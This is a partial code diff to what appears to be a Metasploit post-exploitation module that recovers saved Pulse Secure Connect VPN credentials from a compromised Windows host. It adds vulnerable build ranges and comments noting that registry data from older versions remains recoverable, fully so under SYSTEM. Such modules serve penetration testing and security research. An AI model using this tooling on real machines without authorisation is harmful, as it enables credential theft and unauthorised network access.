@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Post
     return process.memory.read(addr, len)
   end
 
-  def get_version
+  def get_build
     begin
       version_path = "C:\\Program Files (x86)\\Pulse Secure\\Pulse\\versionInfo.ini"
       version_data = session.fs.file.open(version_path).read.to_s
@@ -156,12 +156,17 @@ class MetasploitModule < Msf::Post
     return creds
   end
 
+  def vuln_builds
+     [
+       [Gem::Version.new('0.0.0'), Gem::Version.new('9.0.4')],
+       [Gem::Version.new('9.1.0'), Gem::Version.new('9.1.3')],
+     ]
+  end
+
   def run
-    version = get_version
-    if version >= Gem::Version.new('9.1.4')
-      print_status("Target is running Pulse Secure Connect version #{version}. Not affected.")
-    else
-      print_status("Target is running Pulse Secure Connect version #{version}. Affected.")
+    build = get_build
+    if vuln_builds.any? { |build_range| Gem::Version.new(build).between?(*build_range) }
+      print_status("Target is running Pulse Secure Connect build #{build} (vulnerable).")
       creds = get_creds
       if creds.any?
         creds.each do |cred|
@@ -205,6 +210,13 @@ class MetasploitModule < Msf::Post
       else
         print_error "No users with configs found. Exiting"
       end
+    else
+      print_status("Target is running Pulse Secure Connect build #{build} (not vulnerable).")
+      #Even if the target is running a safe build, data saved in the registry by previous versions of Pulse Secure
+      #is not wiped out during newer versions installation. This means we can still recover that data, minus the connection
+      #details (server url, connection name, etc).
+      #
+      #On top of that, we can still recover full details if executing within an elevated process (SYSTEM).
     end
   end
 end
